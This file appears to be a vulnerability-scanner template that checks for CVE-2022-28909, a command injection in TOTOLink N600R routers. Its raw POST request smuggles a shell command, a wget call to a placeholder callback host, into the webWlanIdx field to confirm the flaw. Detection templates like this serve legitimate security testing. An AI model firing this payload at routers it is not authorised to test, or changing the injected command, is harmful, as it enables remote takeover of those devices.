id: CVE-2022-28909

info:
  name: Totolink N600R - Remote Code Execution
  author: For3stCo1d
  severity: critical
  description: |
    TOTOLink N600R V5.3c.7159_B20190425 was discovered to contain a command injection vulnerability via the webwlanidx parameter in /setting/setWebWlanIdx.
  reference:
    - https://github.com/EPhaha/IOT_vuln/tree/main/TOTOLink/N600R/3
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28909
    - https://nvd.nist.gov/vuln/detail/CVE-2022-28909
  tags: cve,cve2022,totolink,router,rce,oast

requests:
  - raw:
      - |
        POST /cgi-bin/cstecgi.cgi HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        {"topicurl":"setting/setWebWlanIdx","webWlanIdn":"0test$(wget+http://{{interactsh-url}};)"}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the HTTP Interaction
        words:
          - "http"
